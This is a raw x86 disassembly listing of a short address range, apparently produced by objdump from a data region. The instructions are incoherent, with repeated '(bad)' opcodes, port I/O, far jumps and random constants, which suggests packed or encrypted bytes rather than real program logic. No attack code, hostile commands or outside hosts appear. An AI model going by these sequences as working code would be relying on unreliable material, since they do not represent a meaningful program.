  41e759:	(bad)  
  41e75a:	mov    ch,0x90
  41e75c:	in     eax,0x36
  41e75e:	jp     0x41e6ff
  41e760:	or     BYTE PTR [eax-0x2b],ch
  41e763:	dec    ebp
  41e764:	ret    0x5e72
  41e767:	int3   
  41e768:	pop    esp
  41e769:	aad    0x40
  41e76b:	ficom  WORD PTR [esp+eax*8+0x23fb2fee]
  41e772:	shr    dl,1
  41e774:	lods   eax,DWORD PTR ds:[esi]
  41e775:	add    DWORD PTR ds:0xecb09c07,ecx
  41e77b:	cdq    
  41e77c:	int3   
  41e77d:	stos   DWORD PTR es:[edi],eax
  41e77e:	scas   eax,DWORD PTR es:[edi]
  41e77f:	sar    bh,cl
  41e781:	shl    BYTE PTR ds:0xdc2aa9fb,1
  41e787:	out    dx,eax
  41e788:	ins    BYTE PTR es:[edi],dx
  41e789:	dec    DWORD PTR [ebx-0x30]
  41e78c:	cmp    edx,DWORD PTR [esi]
  41e78e:	retf   
  41e78f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e790:	push   ebp
  41e791:	cli    
  41e792:	sub    eax,0x275d03b9
  41e797:	cdq    
  41e798:	push   ebp
  41e799:	stc    
  41e79a:	cli    
  41e79b:	fstp   QWORD PTR [esp+edi*4+0x54b38df1]
  41e7a2:	cmp    DWORD PTR [ecx+0x7f],ebx
  41e7a5:	int    0x81
  41e7a7:	stos   DWORD PTR es:[edi],eax
  41e7a8:	adc    al,0x39
  41e7aa:	adc    BYTE PTR [ebp+0x23],0xc7
  41e7ae:	ret    0x261e
  41e7b1:	dec    ecx
  41e7b2:	ins    BYTE PTR es:[edi],dx
  41e7b3:	cwde   
  41e7b4:	test   al,0x94
  41e7b6:	test   DWORD PTR [eax-0x63],esp
  41e7b9:	into   
  41e7ba:	shl    BYTE PTR [ebx-0x3f1c556c],1
  41e7c0:	xor    bl,ch
  41e7c2:	pop    ss
  41e7c3:	mov    ebp,0xda6ca0af
  41e7c8:	shl    DWORD PTR [ecx+0xe],1
  41e7cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7cc:	dec    ecx
  41e7cd:	lock scas eax,DWORD PTR es:[edi]
  41e7cf:	ja     0x41e849
  41e7d1:	clc    
  41e7d2:	mov    bh,0x93
  41e7d4:	lahf   
  41e7d5:	repz repz daa 
  41e7d8:	dec    edx
  41e7d9:	bnd jne 0x41e80a
  41e7dc:	call   0xf867:0x8a61142f
  41e7e3:	in     al,0x6e
  41e7e5:	pop    esp
  41e7e6:	cmp    DWORD PTR [di],0xc03a179d
  41e7ed:	call   0x3f3b:0x86984516
  41e7f4:	jnp    0x41e7c9
  41e7f6:	jb     0x41e81b
  41e7f8:	inc    edx
  41e7f9:	arpl   WORD PTR [ecx-0x33425ecb],di
  41e7ff:	ja     0x41e83d
  41e801:	popf   
  41e802:	xor    DWORD PTR [ebx],esi
  41e804:	scas   al,BYTE PTR es:[edi]
  41e805:	repnz or eax,0x3df4a9a4
  41e80b:	lods   al,BYTE PTR ds:[esi]
  41e80c:	outs   dx,BYTE PTR ds:[esi]
  41e80d:	cmp    dh,ch
  41e80f:	mov    ecx,0x86701367
  41e814:	fnstenv [eax-0x66552907]
  41e81a:	xchg   edx,eax
  41e81b:	sub    DWORD PTR [edi+0x12],eax
  41e81e:	int3   
  41e81f:	ror    BYTE PTR [edx+ebx*8+0x1d],cl
  41e823:	cmp    DWORD PTR [edx+ebp*4],0x26ff79ea
  41e82a:	dec    edi
  41e82b:	xor    al,0xb5
  41e82d:	ins    DWORD PTR es:[edi],dx
  41e82e:	aaa    
  41e82f:	je     0x41e81a
  41e831:	sbb    eax,0x24ff8642
  41e836:	pop    ecx
  41e837:	jp     0x41e7cd
  41e839:	sbb    BYTE PTR [ecx+0x42],ah
  41e83c:	cmp    al,0xb8
  41e83e:	xor    DWORD PTR [ebx+0xc607],esi
	...
  41e8b4:	les    ebp,FWORD PTR [edi+eax*1-0x64]
  41e8b8:	scas   eax,DWORD PTR es:[edi]
  41e8b9:	(bad)  
  41e8ba:	fistp  QWORD PTR [esi+eiz*4-0x50]
  41e8be:	loop   0x41e93a
  41e8c0:	or     eax,DWORD PTR [ecx]
  41e8c2:	scas   al,BYTE PTR es:[edi]
  41e8c3:	mov    ecx,0x14886
  41e8c8:	test   BYTE PTR [eax],0x0
  41e8cb:	add    BYTE PTR [ecx+ebp*1-0x4e4406de],cl
  41e8d2:	das    
  41e8d3:	imul   ecx,DWORD PTR [eax],0x141b5425
  41e8d9:	push   ss
  41e8da:	cmc    
  41e8db:	(bad)  
  41e8dc:	sar    BYTE PTR [esi],cl
  41e8de:	nop
  41e8df:	ins    BYTE PTR es:[edi],dx
  41e8e0:	imul   esp,DWORD PTR [eax+0x3cfc224],0xffffffea
  41e8e7:	fcmovb st,st(2)
  41e8e9:	jbe    0x41e94e
  41e8eb:	sbb    DWORD PTR [edx],edi
  41e8ed:	jnp    0x41e894
  41e8ef:	jg     0x41e88a
  41e8f1:	push   ebp
  41e8f2:	fld    DWORD PTR [edx+0x6]
  41e8f5:	sbb    eax,0xec055634
  41e8fa:	jbe    0x41e909
  41e8fc:	lock and edi,DWORD PTR [esi]
  41e8ff:	int    0xd4
  41e901:	adc    ch,ah
  41e903:	sub    al,BYTE PTR [esi-0x68792410]
  41e909:	rol    DWORD PTR [eax-0x31],1
  41e90c:	arpl   bp,bx
  41e90e:	enter  0xce4c,0x3d
  41e912:	and    eax,0x72e94039
  41e917:	clc    
  41e918:	xor    BYTE PTR [esi-0x1a38d0ab],ch
  41e91e:	xor    eax,0x2c450b3
  41e923:	pop    edx
  41e924:	cmp    edx,ebp
  41e926:	sub    DWORD PTR [edx+0x57faa0c9],ecx
  41e92c:	out    0xdd,eax
  41e92e:	pop    esi
  41e92f:	mov    bl,0x2
  41e931:	jmp    0xe520:0x90c98c7c
  41e938:	push   es
  41e939:	ret    0x64cb
  41e93c:	inc    eax
  41e93d:	lea    edx,[esi+eiz*4-0x587c4230]
  41e944:	test   BYTE PTR [esp+edx*1],ch
  41e947:	adc    eax,0x4cd56fdf
  41e94c:	and    eax,0xfb791b58
  41e951:	leave  
  41e952:	xor    DWORD PTR [esi-0x6919ed2d],ebx
  41e958:	enter  0x9b01,0xbc
  41e95c:	cmc    
  41e95d:	js     0x41e911
  41e95f:	imul   esi,DWORD PTR [esi+0x72],0x397a85d8
  41e966:	mov    esp,0xec01c3bb
  41e96b:	xchg   ecx,eax
  41e96c:	arpl   WORD PTR [eax-0x193dd661],sp
  41e972:	cmp    ecx,DWORD PTR [ebp+ecx*8+0x7f]
  41e976:	or     eax,0x5bdd6b7
  41e97b:	outs   dx,DWORD PTR ds:[esi]
  41e97c:	sub    BYTE PTR [eax+0x6c],0x5c
  41e980:	iret   
  41e981:	sbb    cl,BYTE PTR [edi+0x3f100e73]
  41e987:	fsubr  QWORD PTR [ebx]
  41e989:	add    al,0x98
  41e98b:	cmp    DWORD PTR [ecx-0x112fa341],ecx
  41e991:	dec    edx
  41e992:	sub    bh,BYTE PTR [ebp+0x58936ccf]
  41e998:	adc    BYTE PTR [edx],bh
  41e99a:	bound  ebx,QWORD PTR es:[ecx+0x3cdbd061]
  41e9a1:	push   eax
  41e9a2:	mov    dl,0xcd
  41e9a4:	lock adc BYTE PTR [edx+0x1a3bca8c],dh
  41e9ab:	sahf   
  41e9ac:	lock rcr BYTE PTR [esp+eiz*8-0xf2b455d],cl
  41e9b4:	addr16 lahf 
  41e9b6:	(bad)  
  41e9b7:	cld    
  41e9b8:	dec    ebx
  41e9b9:	call   0x1469720c
  41e9be:	mov    dl,0xeb
  41e9c0:	xor    DWORD PTR [eax+eax*1],esi
	...
  41ea33:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41ea3a:	cmp    al,0x5f
  41ea3c:	les    ecx,FWORD PTR [ebx+0x21]
  41ea3f:	(bad)  [edx+0x7c8e6d82]
  41ea45:	dec    ecx
  41ea46:	add    DWORD PTR [eax],eax
  41ea48:	test   BYTE PTR [eax],0x0
  41ea4b:	add    BYTE PTR [eax+0x28d62679],dh
  41ea51:	rol    DWORD PTR [ebx+edx*4],cl
  41ea54:	mov    cl,0x79
  41ea56:	or     BYTE PTR [eax],0xa1
  41ea59:	cwde   
  41ea5a:	mov    ds:0x5a25c7c3,al
  41ea5f:	mov    ebx,0x2d490730
  41ea64:	adc    ch,BYTE PTR [ebp+0x64]
  41ea67:	sbb    BYTE PTR [edx-0x34e5cec1],0x16
  41ea6e:	jmp    0x794d:0xdb4cd6d4
  41ea75:	popf   
  41ea76:	add    BYTE PTR [edi+ebp*2+0x6622229a],al
  41ea7d:	fwait
  41ea7e:	push   0xfffffffa
  41ea80:	es (bad) 
  41ea82:	dec    ebx
  41ea83:	mov    ch,0xd4
  41ea85:	cmp    BYTE PTR [ebx+0x7b597cea],al
  41ea8b:	mov    al,ds:0x5570fa3f
  41ea90:	mov    dh,0x2
  41ea92:	sbb    DWORD PTR [eax],ecx
  41ea94:	push   esi
  41ea95:	daa    
  41ea96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea97:	and    DWORD PTR [esi+0x6b227dd6],edx
  41ea9d:	mov    bl,0xe5
  41ea9f:	dec    eax
  41eaa0:	scas   al,BYTE PTR es:[edi]
  41eaa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eaa2:	ins    BYTE PTR es:[edi],dx
  41eaa3:	addr16 cmp al,0xfa
  41eaa6:	repnz mov DWORD PTR [bp+si],esi
  41eaaa:	shr    DWORD PTR [esi],1
  41eaac:	pop    edx
  41eaad:	xchg   ah,bl
  41eaaf:	repnz fcomp st(7)
  41eab2:	mov    DWORD PTR [ebp-0x1fbc974a],ebp
  41eab8:	sbb    ah,0x7
  41eabb:	jne    0x41eb1f
  41eabd:	and    cl,BYTE PTR [eax-0x5d]
  41eac0:	out    dx,al
  41eac1:	loop   0x41ea83
  41eac3:	sub    al,BYTE PTR [edx]
  41eac5:	ret    
  41eac6:	sbb    DWORD PTR [edi-0x2cb0603],esp
  41eacc:	inc    edx
  41eacd:	test   BYTE PTR [ecx-0x18],dl
  41ead0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ead1:	mov    fs,WORD PTR [ebp+ebp*2+0x10b86d7c]
  41ead8:	dec    edi
  41ead9:	jg     0x41eab5
  41eadb:	lods   al,BYTE PTR ds:[esi]
  41eadc:	imul   esp,DWORD PTR ds:[eax-0x4b1fbc82],0x48
  41eae4:	aaa    
  41eae5:	inc    eax
  41eae6:	mov    fs,WORD PTR [edi+0x2f]
  41eae9:	fmul   st(7),st
  41eaeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eaec:	add    DWORD PTR fs:[ecx+esi*4+0x77],ebp
  41eaf1:	add    esp,ebx
  41eaf3:	sub    al,0xc3
  41eaf5:	dec    esi
  41eaf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eaf7:	mov    eax,ds:0x668c012f
  41eafc:	mov    esi,0xb04529c8
  41eb01:	arpl   WORD PTR [ebx-0x3b],sp
  41eb04:	sbb    dh,bl
  41eb06:	cmp    esi,DWORD PTR [edx-0x775d395a]
  41eb0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb0d:	jb     0x41ead4
  41eb0f:	fnstsw WORD PTR [edi-0xef4a899]
  41eb15:	(bad)  
  41eb16:	jle    0x41eb63
  41eb18:	std    
  41eb19:	lds    esi,FWORD PTR [ebx+0x1de0e152]
  41eb1f:	pushf  
  41eb20:	sub    BYTE PTR [ebp+0x12],al
  41eb23:	jo     0x41eb9d
  41eb25:	dec    edx
  41eb26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb27:	add    DWORD PTR [eax+0x76],ebx
  41eb2a:	xchg   esp,eax
  41eb2b:	mov    edx,0xaa8777dc
  41eb30:	pop    es
  41eb31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb32:	inc    edx
  41eb33:	fdivr  st,st(2)
  41eb35:	in     eax,dx
  41eb36:	xchg   edi,eax
  41eb37:	fbstp  TBYTE PTR [ebx]
  41eb39:	fld    st(5)
  41eb3b:	das    
  41eb3c:	add    BYTE PTR [ebp+0x54],dh
  41eb3f:	jle    0x41eb86
  41eb41:	cmp    DWORD PTR [eax],eax
	...
  41ebb3:	add    BYTE PTR [edi-0x36],ch
  41ebb6:	adc    eax,0xefdfb598
  41ebbb:	inc    DWORD PTR [ebx+0x1e]
  41ebbe:	arpl   sp,si
  41ebc0:	repnz sbb eax,0x4a72cfc7
  41ebc6:	add    DWORD PTR [eax],eax
  41ebc8:	test   BYTE PTR [eax],0x0
  41ebcb:	add    BYTE PTR [esi+ebx*2+0x1e],ch
  41ebcf:	mov    esp,0xc415434b
  41ebd4:	mov    dh,0x6e
  41ebd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebd7:	mov    al,ds:0x6b7193c2
  41ebdc:	push   cs
  41ebdd:	jnp    0x41ec54
  41ebdf:	and    DWORD PTR [edi+0x5d3fcead],esi
  41ebe5:	hlt    
  41ebe6:	icebp  
  41ebe7:	adc    BYTE PTR [edx+edi*8],0x8d
  41ebeb:	cmp    cl,BYTE PTR [ebx]
  41ebed:	push   cs
  41ebee:	add    bl,bl
  41ebf0:	es and dh,ch
  41ebf3:	xchg   ebp,eax
  41ebf4:	dec    ebx
  41ebf5:	sbb    ah,bh
  41ebf7:	sahf   
  41ebf8:	mov    eax,ds:0x6184084f
  41ebfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebfe:	imul   ebx,DWORD PTR [ebp+0x63],0xffffffbf
  41ec02:	sub    ebx,edi
  41ec04:	sbb    DWORD PTR [eax],esp
  41ec06:	lods   eax,DWORD PTR es:[esi]
  41ec08:	inc    eax
  41ec09:	pop    es
  41ec0a:	push   0xa
  41ec0c:	inc    esp
  41ec0d:	(bad)  
  41ec0e:	mov    BYTE PTR [ecx+0x6ae86ee4],bl
  41ec14:	icebp  
  41ec15:	nop
  41ec16:	outs   dx,BYTE PTR ds:[esi]
  41ec17:	inc    eax
  41ec18:	in     al,dx
  41ec19:	cwde   
  41ec1a:	ret    0xd552
  41ec1d:	xchg   edx,eax
  41ec1e:	les    eax,FWORD PTR [ebx]
  41ec20:	pop    ecx
  41ec21:	fild   DWORD PTR [ebx+0x2c]
  41ec24:	cmp    al,0xe4
  41ec27:	or     DWORD PTR [eax+ebp*4+0x24],0x45
  41ec2c:	add    bh,BYTE PTR [edi+eax*2+0x495ca9cd]
  41ec33:	jecxz  0x41ec92
  41ec35:	arpl   WORD PTR [esi-0x62],bp
  41ec38:	(bad)  
  41ec39:	pop    esi
  41ec3a:	shl    edx,1
  41ec3c:	adc    eax,0x3bca41eb
  41ec41:	jg     0x41ec5f
  41ec43:	add    edx,DWORD PTR [ecx]
  41ec45:	mov    ds:0x62df797,al
  41ec4a:	ds call 0xbf8c5c5d
  41ec50:	xlat   BYTE PTR ds:[ebx]
  41ec51:	push   ebx
  41ec52:	shl    BYTE PTR cs:[ebp-0x7945780d],0x83
  41ec5a:	add    edi,DWORD PTR [eax]
  41ec5c:	xchg   esi,eax
  41ec5d:	int3   
  41ec5e:	out    0xac,eax
  41ec60:	xchg   ebx,eax
  41ec61:	popa   
  41ec62:	sub    ebx,DWORD PTR [edi]
  41ec64:	mov    cl,0xd0
  41ec66:	cmp    BYTE PTR [ebx-0x266b9e84],dl
  41ec6c:	jae    0x41eca6
  41ec6e:	jb     0x41eca6
  41ec70:	inc    eax
  41ec71:	jmp    FWORD PTR [edx]
  41ec73:	push   edi
  41ec74:	mov    edi,0xdf6f45af
  41ec79:	pop    esp
  41ec7a:	mov    al,ds:0x67c45451
  41ec7f:	ror    DWORD PTR [ebx],1
  41ec81:	test   BYTE PTR [eax],ch
  41ec83:	pusha  
  41ec84:	inc    edi
  41ec85:	test   al,0xc3
  41ec87:	jno    0x41eca7
  41ec89:	or     ebp,ebx
  41ec8b:	push   esp
  41ec8c:	ins    BYTE PTR es:[edi],dx
  41ec8d:	and    eax,0x6e6bb0ea
  41ec92:	in     al,dx
  41ec93:	je     0x41ec38
  41ec95:	sub    al,0xcc
  41ec97:	mov    BYTE PTR [esi+ecx*2],ch
  41ec9a:	sbb    dl,BYTE PTR [esi+edx*8]
  41ec9d:	out    0x9f,al
  41ec9f:	xchg   edx,eax
  41eca0:	sbb    BYTE PTR [edi+0x64],bl
  41eca3:	popf   
  41eca4:	lods   eax,DWORD PTR ds:[esi]
  41eca5:	mov    ebx,0xe09ed888
  41ecaa:	cmc    
  41ecab:	mov    eax,0xe8499748
  41ecb0:	and    bh,BYTE PTR [eax-0x318f12fe]
  41ecb6:	imul   ebp,DWORD PTR [edx+0x28],0xffffffc0
  41ecba:	(bad)  
  41ecbb:	out    dx,al
  41ecbc:	fwait
  41ecbd:	xor    BYTE PTR [eax],bl
  41ecbf:	mov    edx,0xf015
	...
  41ed34:	and    bl,dh
  41ed36:	das    
  41ed37:	cmp    bh,0xde
  41ed3a:	lods   eax,DWORD PTR ds:[esi]
  41ed3b:	repz xlat BYTE PTR ds:[ebx]
  41ed3d:	in     al,dx
  41ed3e:	pusha  
  41ed3f:	out    dx,al
  41ed40:	adc    BYTE PTR [ecx+0x4b683837],dl
  41ed46:	add    DWORD PTR [eax],eax
  41ed48:	test   BYTE PTR [eax],0x0
  41ed4b:	add    BYTE PTR [edx],bh
  41ed4d:	dec    esp
  41ed4e:	pop    ecx
  41ed4f:	push   es
  41ed50:	xor    bh,al
  41ed52:	mov    bl,0xc5
  41ed54:	bound  eax,QWORD PTR [eax-0xc526fc3]
  41ed5a:	and    esi,DWORD PTR [eax]
  41ed5c:	sbb    eax,0x20c8eb1a
  41ed61:	jne    0x41ed88
  41ed63:	add    bl,bh
  41ed65:	ror    DWORD PTR [esi],0x45
  41ed68:	out    0xa8,al
  41ed6a:	stos   BYTE PTR es:[edi],al
  41ed6b:	bound  esi,QWORD PTR [edx+0x6]
  41ed6e:	xchg   BYTE PTR [ebx],dh
  41ed70:	retf   0x298d
  41ed73:	jbe    0x41edec
  41ed75:	ss rep stos DWORD PTR es:[edi],eax
  41ed78:	mov    ds:0xe70a1960,eax
  41ed7d:	out    dx,al
  41ed7e:	rol    DWORD PTR [edi-0x697b377],cl
  41ed84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed85:	imul   esi,ebp,0xffffffbd
  41ed88:	push   ebp
  41ed89:	in     eax,dx
  41ed8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed8b:	in     eax,dx
  41ed8c:	leave  
  41ed8d:	pop    edx
  41ed8e:	add    BYTE PTR [esi+eax*1],dl
  41ed91:	pop    ecx
  41ed92:	loopne 0x41ed58
  41ed94:	in     eax,dx
  41ed95:	mov    edx,0x9753dd79
  41ed9a:	jmp    0x41eddf
  41ed9c:	fiadd  WORD PTR [ebp+edx*4-0x4f]
  41eda0:	gs mov ebp,0xe35d3ca8
  41eda6:	fcomip st,st(3)
  41eda8:	test   DWORD PTR [ecx],esi
  41edaa:	adc    al,0xd0
  41edac:	pop    edi
  41edad:	popf   
  41edae:	add    DWORD PTR [esi],0xffffffe5
  41edb1:	call   0x4428:0x42e71d68
  41edb8:	mov    ds:0x69f20941,al
  41edbd:	jno    0x41ed98
  41edbf:	(bad)  
  41edc0:	mov    BYTE PTR [edi-0x2f],ah
  41edc3:	ds ret 0x26a0
  41edc7:	lahf   
  41edc8:	sub    bl,BYTE PTR [ebx-0x7589c04e]
  41edce:	test   DWORD PTR [bp+di],0x3e884dbf
  41edd5:	ins    BYTE PTR es:[edi],dx
  41edd6:	lods   al,BYTE PTR ds:[esi]
  41edd7:	jne    0x41ee2b
  41edd9:	test   dh,bl
  41eddb:	pop    edx
  41eddc:	push   ebp
  41eddd:	cmp    dl,cl
  41eddf:	out    0x15,al
  41ede1:	mov    ds:0x3b99f49a,al
  41ede6:	retf   0x5f5c
  41ede9:	cli    
  41edea:	loope  0x41ed9b
  41edec:	mov    eax,DWORD PTR [ecx-0x6c79c0f4]
  41edf2:	sub    DWORD PTR [eax],0x6d
  41edf5:	int3   
  41edf6:	stc    
  41edf7:	xchg   DWORD PTR [ecx+0x6697b7c9],esp
  41edfd:	aad    0xf1
  41edff:	push   edx
  41ee00:	sub    al,0xa6
  41ee02:	xor    BYTE PTR ds:0xd2d7fd80,ch
  41ee09:	add    eax,0x943b4c0b
  41ee0e:	pushf  
  41ee0f:	push   edx
  41ee10:	cmp    ecx,DWORD PTR [ecx+0x45]
  41ee13:	stos   BYTE PTR es:[edi],al
  41ee14:	nop
  41ee15:	int    0x37
  41ee17:	xchg   ebp,eax
  41ee18:	stc    
  41ee19:	mov    ecx,0x8ea662e7
  41ee1e:	cmc    
  41ee1f:	pop    ss
  41ee20:	jl     0x41edb1
  41ee22:	shr    esi,cl
  41ee24:	jo     0x41eea3
  41ee26:	xchg   edi,eax
  41ee27:	mov    edi,DWORD PTR [ebx]
  41ee29:	stc    
  41ee2a:	xchg   ecx,eax
  41ee2b:	adc    DWORD PTR [eax-0x33572c1b],ebx
  41ee31:	aad    0x82
  41ee33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee34:	shl    BYTE PTR [ecx],0x9e
  41ee37:	bound  ebx,QWORD PTR [ebx+ecx*2]
  41ee3a:	mov    ah,0xd7
  41ee3c:	xor    eax,0xfb9e93dc
  41ee41:	push   ecx
	...
  41eeb2:	add    BYTE PTR [eax],al
  41eeb4:	aas    
  41eeb5:	daa    
  41eeb6:	push   ss
  41eeb7:	cld    
  41eeb8:	push   ds
  41eeb9:	std    
  41eeba:	jmp    edi
  41eebc:	push   eax
  41eebd:	jg     0x41eee4
  41eebf:	push   esp
  41eec0:	lods   al,BYTE PTR ds:[esi]
  41eec1:	mov    edx,0x4c5eb45f
  41eec6:	add    DWORD PTR [eax],eax
  41eec8:	test   BYTE PTR [eax],0x0
  41eecb:	add    cl,dh
  41eecd:	fucomip st,st(7)
  41eecf:	xchg   esp,ecx
  41eed1:	dec    eax
  41eed2:	xchg   esi,eax
  41eed3:	push   ss
  41eed4:	les    esi,FWORD PTR ds:0x82d9405d
  41eeda:	aad    0xde
  41eedc:	lods   al,BYTE PTR ds:[esi]
  41eedd:	mov    esi,0x852f81fd
  41eee2:	mov    ds:0xfca01eae,eax
  41eee7:	pop    es
  41eee8:	test   al,0x70
  41eeea:	mov    ah,0xfe
  41eeec:	outs   dx,BYTE PTR ds:[esi]
  41eeed:	test   DWORD PTR [edi+0x7a],eax
  41eef0:	test   BYTE PTR [edx+edx*1+0x21c6c0b6],bl
  41eef7:	mov    dh,0xd5
  41eef9:	cmp    BYTE PTR [ecx+0x214f0bb1],0xc2
  41ef00:	push   edi
  41ef01:	adc    ecx,ecx
  41ef03:	jg     0x41ef21
  41ef05:	jnp    0x41ee8d
  41ef07:	dec    eax
  41ef08:	scas   al,BYTE PTR es:[edi]
  41ef09:	retf   
  41ef0a:	sti    
  41ef0b:	mov    ebx,0xd471bed
  41ef10:	adc    DWORD PTR [ecx],esp
  41ef12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef13:	dec    edi
  41ef14:	out    0xc8,al
  41ef16:	(bad)  
  41ef17:	arpl   WORD PTR [eax+0x4dde69e],sp
  41ef1d:	inc    ebx
  41ef1e:	in     al,dx
  41ef1f:	jl     0x41ef92
  41ef21:	xor    edx,DWORD PTR [esi+0x2e]
  41ef24:	ror    dl,1
  41ef26:	or     DWORD PTR [edx-0x3f7b7f85],ebp
  41ef2c:	bound  edi,QWORD PTR [edi]
  41ef2e:	mov    cs,WORD PTR [edx+0x4f3d5c7]
  41ef34:	xor    BYTE PTR [edx+esi*4+0x1],ah
  41ef38:	imul   edi,esp,0xffffffa2
  41ef3b:	mov    al,0x8b
  41ef3d:	pop    ebp
  41ef3e:	stc    
  41ef3f:	hlt    
  41ef40:	loopne 0x41eec2
  41ef42:	je     0x41efbe
  41ef44:	stos   DWORD PTR es:[edi],eax
  41ef45:	jb     0x41efa4
  41ef47:	jmp    0x41ef91
  41ef49:	les    ecx,FWORD PTR [edx-0x7d]
  41ef4c:	push   0xffffff8d
  41ef4e:	jno    0x41ef2d
  41ef50:	and    DWORD PTR [edx],edi
  41ef52:	ss sbb eax,0x6ab758a8
  41ef58:	fsubr  QWORD PTR [ecx+0x73e4e6a8]
  41ef5e:	call   0x468ad3eb
  41ef63:	pop    esp
  41ef64:	les    ebx,FWORD PTR [ebx+0x68]
  41ef67:	mov    bl,0xe5
  41ef69:	test   edi,0x52340838
  41ef6f:	or     al,0x4a
  41ef71:	and    al,0xc2
  41ef73:	aad    0x93
  41ef75:	popf   
  41ef76:	mov    ds:0x6f3cbc91,al
  41ef7b:	test   eax,0x81c806ca
  41ef80:	sub    DWORD PTR [edx+0x6b95c073],0x4c
  41ef87:	stos   DWORD PTR es:[edi],eax
  41ef88:	or     eax,0xeaa4273
  41ef8d:	cli    
  41ef8e:	cli    
  41ef8f:	(bad)  
  41ef90:	jnp    0x41ef38
  41ef92:	and    BYTE PTR [ecx-0x2d18ea70],ch
  41ef98:	(bad)  
  41ef99:	fsubr  DWORD PTR [ecx]
  41ef9b:	push   esi
  41ef9c:	enter  0x1b60,0x5b
  41efa0:	lock pop eax
  41efa2:	or     BYTE PTR [esi-0x76],dh
  41efa5:	dec    ebx
  41efa6:	inc    ebx
  41efa7:	mov    ds:0xea285225,eax
  41efac:	in     eax,0xf9
  41efae:	dec    ecx
  41efaf:	sbb    edx,DWORD PTR [ebx+0x471d1405]
  41efb5:	adc    al,0x93
  41efb7:	xor    ebp,DWORD PTR [edx-0x4c]
  41efba:	jmp    0x41efb2
  41efbc:	sti    
  41efbd:	jmp    0x41efe8
  41efbf:	mov    edi,0xd1
	...
  41f031:	add    BYTE PTR [eax],al
  41f033:	add    BYTE PTR [edi+0x53],cl
  41f036:	add    al,0xc
  41f038:	sbb    al,0x5f
  41f03a:	dec    edi
  41f03b:	push   ebx
  41f03c:	cwde   
  41f03d:	adc    edi,DWORD PTR [ebp+ecx*4-0x19]
  41f041:	push   es
  41f042:	inc    ecx
  41f043:	mov    eax,0x14d54
  41f048:	test   BYTE PTR [eax],0x0
  41f04b:	add    BYTE PTR ds:0x7fa4c4f,bh
  41f051:	mov    BYTE PTR [esi+0x30],0xd1
  41f055:	add    al,0x5b
  41f057:	add    dl,BYTE PTR [ebx]
  41f059:	sbb    BYTE PTR [edi-0x75],0x86
  41f05d:	and    al,0x8
  41f05f:	out    0x92,eax
  41f061:	sub    DWORD PTR [edi],ecx
  41f063:	or     al,0xe1
  41f065:	sub    esi,DWORD PTR [ecx-0x35fc116c]
  41f06b:	test   DWORD PTR ds:[ebx],eax
  41f06e:	rcr    BYTE PTR [bp-0x42ee],1
  41f073:	aam    0xc1
  41f075:	fwait
  41f076:	jmp    0xb81980f
  41f07b:	dec    DWORD PTR [edi+esi*8-0x6e]
  41f07f:	sub    BYTE PTR [ebx+0x2ab6042d],dl
  41f085:	adc    DWORD PTR [ecx-0x23],esi
  41f088:	pushf  
  41f089:	add    eax,0xce761414
  41f08e:	mov    edi,0x542a944a
  41f093:	jns    0x41f070
  41f095:	cmp    DWORD PTR [ecx-0x66908f52],0x49b36d24
  41f09f:	mov    BYTE PTR [ebx-0x27],ch
  41f0a2:	test   eax,0xd9cccb85
  41f0a7:	clc    
  41f0a8:	popa   
  41f0a9:	mov    eax,0x882badfd
  41f0ae:	ja     0x41f09d
  41f0b0:	xor    al,0x48
  41f0b2:	sbb    BYTE PTR [ebx+0x43517a1c],dl
  41f0b8:	sbb    DWORD PTR [ebp+0x72],edi
  41f0bb:	xchg   ebp,eax
  41f0bc:	aam    0x8c
  41f0be:	push   cs
  41f0bf:	enter  0x6126,0x5b
  41f0c3:	sub    al,0x7f
  41f0c5:	mov    ebp,0x3140e68d
  41f0ca:	xchg   BYTE PTR [ebx-0x1e7995e9],bh
  41f0d0:	(bad)
  41f0d3:	pop    esi
  41f0d4:	fcmovnb st,st(0)
  41f0d6:	daa    
  41f0d7:	and    dh,cl
  41f0d9:	enter  0xc197,0x91
  41f0dd:	jo     0x41f0f5
  41f0df:	xor    ah,BYTE PTR cs:[esi-0x6]
  41f0e3:	lock bound edi,QWORD PTR [ecx+0x3e99f5ec]
  41f0ea:	cld    
  41f0eb:	jnp    0x41f0b1
  41f0ed:	jnp    0x41f0f6
  41f0ef:	aam    0xb9
  41f0f1:	mov    eax,ds:0x6606b822
  41f0f6:	(bad)  
  41f0f8:	mov    bh,0x42
  41f0fa:	loop   0x41f170
  41f0fc:	sti    
  41f0fd:	out    0xfa,al
  41f0ff:	outs   dx,BYTE PTR ds:[esi]
  41f100:	mov    ah,BYTE PTR [edi+ebx*8-0x82c5e26]
  41f107:	mov    ch,0x9e
  41f109:	dec    edx
  41f10a:	(bad)  
  41f10b:	mov    bl,0xe0
  41f10d:	push   cs
  41f10e:	into   
  41f10f:	pop    ebx
  41f110:	and    cl,BYTE PTR [edi-0x51ef54c0]
  41f116:	mov    ebx,0x5bdd780f
  41f11b:	inc    ecx
  41f11c:	and    eax,DWORD PTR [ebp-0x41]
  41f11f:	and    eax,0xda2bc4be
  41f124:	xchg   DWORD PTR [eax+0x6b100d],edx
  41f12a:	or     BYTE PTR [esi],al
  41f12c:	sub    al,0x2a
  41f12e:	mov    ebx,0x7d403758
  41f133:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f134:	test   BYTE PTR [ebp+0x4526c7ef],dl
  41f13a:	inc    ebx
  41f13b:	pop    esp
  41f13c:	adc    al,0xbc
